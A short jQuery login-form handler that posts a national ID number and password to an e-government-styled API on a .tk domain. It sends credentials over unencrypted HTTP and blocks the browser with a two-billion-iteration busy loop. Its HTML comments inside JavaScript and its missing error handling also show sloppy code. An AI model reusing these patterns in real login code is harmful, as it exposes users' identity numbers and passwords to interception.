$(document).ready(function () {
	$('#loginForm').submit(function(e) {
		var nik = $('#nik').val();
			var password = $('#password').val()
				$.ajax({
			        url: 'http://e-gov-bandung.tk/dukcapil/api/public/auth/login',
			        type: 'POST',
			        data: { nik: nik, password : password} ,
			        success: function (response) {
			            console.log(response.id)
			            <!-- for (var i = 0; i < 2000000000; ++i); -->
			            <!-- return false; -->
			            return true;
			        },
			        error: function (err) {
			        	<!-- alert(err); -->
			        	<!-- console.log(err) -->
			        	<!-- return false; -->
			        }
			    });
		for (var i = 0; i < 2000000000; ++i);
	});
});